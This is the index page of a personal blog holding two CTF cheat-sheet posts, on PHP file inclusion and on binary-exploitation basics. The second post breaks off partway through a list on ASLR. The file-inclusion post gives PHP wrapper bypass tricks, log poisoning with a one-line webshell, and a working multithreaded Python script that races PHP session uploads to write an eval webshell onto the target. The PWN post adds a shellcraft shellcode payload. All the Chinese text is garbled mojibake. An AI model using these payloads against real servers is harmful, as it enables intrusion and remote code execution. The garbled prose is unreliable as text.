<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"jasmineaura.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"fold":{"enable":true,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="It&#39;s just a matter of time">
<meta property="og:type" content="website">
<meta property="og:title" content="JasmineAura&#39;s Blog">
<meta property="og:url" content="http://jasmineaura.github.io/index.html">
<meta property="og:site_name" content="JasmineAura&#39;s Blog">
<meta property="og:description" content="It&#39;s just a matter of time">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="JasmineAura">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://jasmineaura.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>JasmineAura's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">JasmineAura's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">JasmineAura</p>
  <div class="site-description" itemprop="description">It's just a matter of time</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">æ ‡ç­¾</span>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="è¿”å›é¡¶éƒ¨">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://jasmineaura.github.io/2024/07/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="JasmineAura">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JasmineAura's Blog">
      <meta itemprop="description" content="It's just a matter of time">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | JasmineAura's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/07/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">æ–‡ä»¶åŒ…å«</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2024-07-29 16:07:54 / ä¿®æ”¹æ—¶é—´ï¼š16:10:24" itemprop="dateCreated datePublished" datetime="2024-07-29T16:07:54+08:00">2024-07-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h3><h5 id="php-filter-åè®®"><a href="#php-filter-åè®®" class="headerlink" title="php://filter åè®®"></a><code>php://filter</code> åè®®</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx</span><br></pre></td></tr></table></figure>
<p>å¦™ç”¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*]php://filterå¯ä»¥ç»•è¿‡ exit; die();</span><br><span class="line">[*]ä¼ å…¥çš„æŒ‡ä»¤éœ€è¦æå‰rot13å¤„ç†ï¼Œç„¶åfilterè¿›è¡Œrot13ï¼Œè¿™æ ·ä¼ å…¥çš„æŒ‡ä»¤ä¸å—å½±å“ï¼Œè€Œexitæˆ–dieéƒ½è¢«ä¿®æ”¹æ‰äº†.</span><br><span class="line"></span><br><span class="line">[!]php://filter/write=string.rot13/resource=a.php</span><br><span class="line">[!]POSTè¯·æ±‚ä¸­å¡«å…¥æŒ‡ä»¤</span><br><span class="line"></span><br><span class="line">[+]ä¹Ÿå¯ä»¥ä½¿ç”¨php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br><span class="line">[#]UCS-2å¯¹å­—ç¬¦ä¸²æ¯2ä½åè½¬ä¸€æ¬¡.</span><br></pre></td></tr></table></figure>

<p>UCS-2ç¼–ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;command&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="data-text-åè®®"><a href="#data-text-åè®®" class="headerlink" title="data://text åè®®"></a><code>data://text</code> åè®®</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¢«åŒ…å«æ—¶ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡ŒæŒ‡ä»¤ï¼Œå¦‚æœæ€•è¿‡æ»¤ï¼Œå¯ä»¥æå‰Base64ç¼–ç .</span><br><span class="line">[*]data://text/plain;æŒ‡ä»¤</span><br><span class="line">[$]data://text/plain;base64,base64åŠ å¯†çš„æŒ‡ä»¤</span><br></pre></td></tr></table></figure>


<h5 id="php-input-åè®®"><a href="#php-input-åè®®" class="headerlink" title="php://input åè®®"></a><code>php://input</code> åè®®</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?xxx=php://input</span><br><span class="line"></span><br><span class="line">[+]åœ¨POSTè¯·æ±‚ä¸­å¡«å…¥éœ€è¦inputçš„å†…å®¹</span><br></pre></td></tr></table></figure>

<h3 id="æ—¥å¿—åŒ…å«"><a href="#æ—¥å¿—åŒ…å«" class="headerlink" title="æ—¥å¿—åŒ…å«"></a>æ—¥å¿—åŒ…å«</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ—¥å¿—æ–‡ä»¶è·¯å¾„: /var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">[1]åœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼ˆä¸è¦ç”¨åŒå¼•å·ï¼‰</span><br><span class="line">[2]åœ¨POSTè¯·æ±‚ä¸­è¿›è¡ŒRCEï¼Œurl?file=/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">[!]èšå‰‘å¯èƒ½æ— æ³•è¿æ¥ï¼ˆå°½é‡ä¸è¦ä½¿ç”¨ï¼‰ï¼ˆå¯ä»¥åœ¨èšå‰‘è®¾ç½®é‡Œé¢å¿½ç•¥httpè¯ä¹¦ï¼‰</span><br></pre></td></tr></table></figure>

<h3 id="Sessionæ¡ä»¶ç«äº‰åŒ…å«"><a href="#Sessionæ¡ä»¶ç«äº‰åŒ…å«" class="headerlink" title="Sessionæ¡ä»¶ç«äº‰åŒ…å«"></a>Sessionæ¡ä»¶ç«äº‰åŒ…å«</h3><p>åŸç†ï¼š<br>phpä¸­çš„session.upload_progresså’Œsession.upload_progress.cleanupé»˜è®¤å¼€å¯ï¼Œå¯ä»¥é€šè¿‡æ‰¹é‡åœ¨Sessionä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶æ‰¹é‡åŒ…å«ï¼Œä»è€Œgetshell.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[1]ä½¿ç”¨upload.htmlä¸Šä¼ æ–‡ä»¶ï¼Œç”¨BurpæŠ“åŒ…ï¼ŒCookieä¸­å†…å®¹ä¿®æ”¹ä¸ºPHPSESSID=flag</span><br><span class="line">[2]å†™å…¥å‘½ä»¤</span><br><span class="line">[3]æ‰¹é‡åŒ…å«Sessionæ–‡ä»¶ï¼Œurl?file=/tmp/sess_flag</span><br><span class="line"></span><br><span class="line">[!]éœ€è¦ä½¿ç”¨upload.html</span><br><span class="line">[!]ä¸Šä¼ çš„æ–‡ä»¶éœ€è¦&gt;500KBï¼Œé˜²æ­¢æ¥ä¸åŠåŒ…å«</span><br><span class="line">[!]ä½¿ç”¨upload.htmlè®°å¾—å°†urlæ”¹ä¸ºå½“å‰é¢˜ç›®url</span><br><span class="line"></span><br><span class="line">[*]å¯ä»¥ä½¿ç”¨è¶…çº§è„šæœ¬</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_unset</span>(); </span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;        </span><br><span class="line">	<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);     </span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;               </span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);           </span><br><span class="line">	&#125;           </span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#å‡ºç°è¿™ç§å†…å®¹ï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨Sessionæ¡ä»¶ç«äº‰åŒ…å«</span></span><br></pre></td></tr></table></figure>

<h5 id="è¶…çº§è„šæœ¬"><a href="#è¶…çº§è„šæœ¬" class="headerlink" title="è¶…çº§è„šæœ¬"></a>è¶…çº§è„šæœ¬</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;é¢˜ç›®åœ°å€&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/muma.php&#x27;,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;  </span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">post ä¼ é€’å†…å®¹å¯åœ¨ç½‘ç«™ç›®å½•ä¸‹å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</span></span><br><span class="line"><span class="string">æ ¹æ®èµ„æ–™ï¼Œå†…å®¹æš‚å­˜åœ¨ /tmp/ ç›®å½•ä¸‹ sess_sessionid æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="string">sessionid å¯æ§ï¼Œæ‰€ä»¥è¿™é‡Œå³ /tmp/sess_ctfshowã€‚</span></span><br><span class="line"><span class="string">è¿™æ ·ä¸€æ—¦è®¿é—®æˆåŠŸï¼Œå°±è¯´æ˜æœ¨é©¬æ¤å…¥äº†</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># /tmp/sess_sessionid ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):  </span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url,</span><br><span class="line">			data=&#123;</span><br><span class="line">			<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">			&#125;,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			files=&#123;</span><br><span class="line">			<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">			&#125;,</span><br><span class="line">			verify = <span class="literal">False</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># è®¿é—® /tmp/sess_sessionidï¼Œpost ä¼ é€’ä¿¡æ¯ï¼Œä¿å­˜æ–°æœ¨é©¬ã€‚</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,</span><br><span class="line">	        data=data,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			verify = <span class="literal">False</span></span><br><span class="line">			)</span><br><span class="line">		<span class="comment"># è®¿é—®æœ¨é©¬æ–‡ä»¶ï¼Œå¦‚æœè®¿é—®åˆ°äº†å°±ä»£è¡¨ç«äº‰æˆåŠŸ</span></span><br><span class="line">		resposne2=session.get(url+<span class="string">&#x27;muma.php&#x27;</span>,verify = <span class="literal">False</span>)</span><br><span class="line">		<span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="comment"># å†™å…¥å’Œè®¿é—®åˆ†åˆ«è®¾ç½® 5 ä¸ªçº¿ç¨‹ã€‚</span></span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"> </span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://jasmineaura.github.io/2024/07/29/PWN%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="JasmineAura">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JasmineAura's Blog">
      <meta itemprop="description" content="It's just a matter of time">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | JasmineAura's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/07/29/PWN%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">PWNåŸºç¡€</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2024-07-29 16:07:35 / ä¿®æ”¹æ—¶é—´ï¼š16:08:38" itemprop="dateCreated datePublished" datetime="2024-07-29T16:07:35+08:00">2024-07-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="GCCç¼–è¯‘"><a href="#GCCç¼–è¯‘" class="headerlink" title="GCCç¼–è¯‘"></a>GCCç¼–è¯‘</h3><p><code>gcc æ–‡ä»¶</code><br>æ–‡ä»¶çš„åç¼€åä¸ºâ€.câ€.</p>
<h3 id="è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶"><a href="#è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶"></a>è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</h3><p><code>./æ–‡ä»¶</code></p>
<h3 id="ç¼–è¯‘æ±‡ç¼–ç¨‹åº-asm-ä¸ºå¯æ‰§è¡Œæ–‡ä»¶"><a href="#ç¼–è¯‘æ±‡ç¼–ç¨‹åº-asm-ä¸ºå¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ç¼–è¯‘æ±‡ç¼–ç¨‹åº(.asm)ä¸ºå¯æ‰§è¡Œæ–‡ä»¶"></a>ç¼–è¯‘æ±‡ç¼–ç¨‹åº(<code>.asm</code>)ä¸ºå¯æ‰§è¡Œæ–‡ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf example.asm -o example.o</span><br><span class="line">ld -m elf_i386 example.o -o example</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘åï¼Œexampleå³ä¸ºå¯æ‰§è¡Œæ–‡ä»¶.</p>
<h3 id="ç¼–è¯‘æ±‡ç¼–è¯­è¨€æºæ–‡ä»¶-s-ä¸ºå¯æ‰§è¡Œæ–‡ä»¶"><a href="#ç¼–è¯‘æ±‡ç¼–è¯­è¨€æºæ–‡ä»¶-s-ä¸ºå¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ç¼–è¯‘æ±‡ç¼–è¯­è¨€æºæ–‡ä»¶(.s)ä¸ºå¯æ‰§è¡Œæ–‡ä»¶"></a>ç¼–è¯‘æ±‡ç¼–è¯­è¨€æºæ–‡ä»¶(<code>.s</code>)ä¸ºå¯æ‰§è¡Œæ–‡ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o example example.s</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘åï¼Œexampleå³ä¸ºå¯æ‰§è¡Œæ–‡ä»¶.</p>
<h3 id="è¾“å‡ºæµè¢«å…³é—­"><a href="#è¾“å‡ºæµè¢«å…³é—­" class="headerlink" title="è¾“å‡ºæµè¢«å…³é—­"></a>è¾“å‡ºæµè¢«å…³é—­</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec å‘½ä»¤ 1&gt;&amp;0</span><br><span class="line"></span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">exec ls 1&gt;&amp;0</span><br><span class="line">exec cat flag 1&gt;&amp;0</span><br></pre></td></tr></table></figure>

<h3 id="gotèŠ‚ä¸-got-pltèŠ‚"><a href="#gotèŠ‚ä¸-got-pltèŠ‚" class="headerlink" title=".gotèŠ‚ä¸.got.pltèŠ‚"></a>.gotèŠ‚ä¸.got.pltèŠ‚</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*]ä½¿ç”¨ checksec æ–‡ä»¶     //æŸ¥çœ‹æ–‡ä»¶çš„RELRO</span><br><span class="line">[-]å½“RELROä¸ºPartial RELROæ—¶ï¼Œè¡¨ç¤º.gotä¸å¯å†™è€Œ.got.pltå¯å†™ã€‚  </span><br><span class="line">[-]å½“RELROä¸ºFullRELROæ—¶ï¼Œè¡¨ç¤º.gotä¸å¯å†™.got.pltä¹Ÿä¸å¯å†™ã€‚  </span><br><span class="line">[-]å½“RELROä¸ºNo RELROæ—¶ï¼Œè¡¨ç¤º.gotä¸.got.pltéƒ½å¯å†™ã€‚</span><br><span class="line"></span><br><span class="line">[*]readelf -S æ–‡ä»¶       //æŸ¥çœ‹æ–‡ä»¶æ‰€æœ‰èŠ‚çš„åœ°å€</span><br></pre></td></tr></table></figure>

<h3 id="shellcraft"><a href="#shellcraft" class="headerlink" title="shellcraft"></a>shellcraft</h3><p>NXä¿æŠ¤å…³é—­æ—¶ï¼Œå¯ä»¥ç›´æ¥å‘é€shellcode.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.sh()) <span class="comment"># ä½¿ç”¨ pwntools çš„ shellcraft æ¨¡å—ç”Ÿæˆä¸€ä¸ª shellcodeï¼Œå¹¶ä½¿ç”¨ asm å‡½æ•°å°†å…¶æ±‡ç¼–æˆäºŒè¿›åˆ¶æŒ‡ä»¤</span></span><br></pre></td></tr></table></figure>

<h3 id="ASLRç›¸å…³"><a href="#ASLRç›¸å…³" class="headerlink" title="ASLRç›¸å…³"></a>ASLRç›¸å…³</h3><p>ASLRï¼ˆAddress Space Layout Randomizationï¼‰æ˜¯ä¸€ç§æ“ä½œç³»ç»Ÿçº§åˆ«çš„å®‰å…¨åŠŸèƒ½ï¼Œå®ƒé€šè¿‡åœ¨æ¯æ¬¡ç¨‹åºè¿è¡Œæ—¶éšæœºåŒ–å†…å­˜åœ°å€çš„å¸ƒå±€ï¼Œä½¿å¾—æ”»å‡»è€…æ›´éš¾ä»¥åˆ©ç”¨å†…å­˜åœ°å€çš„å›ºå®šä½ç½®è¿›è¡Œæ”»å‡».</p>
<p>å¯ä»¥å°†è¯¥æ–‡ä»¶çš„å€¼è®¾ç½®ä¸ºä»¥ä¸‹å‡ ä¸ªé€‰é¡¹ä¹‹ä¸€æ¥æ§åˆ¶ ASLR çš„è¡Œä¸ºï¼š</p>
<ul>
<li>0ï¼šå…³é—­ ASLRï¼Œå†…å­˜å¸ƒå±€ä¸éšæœºåŒ–ã€‚</li>
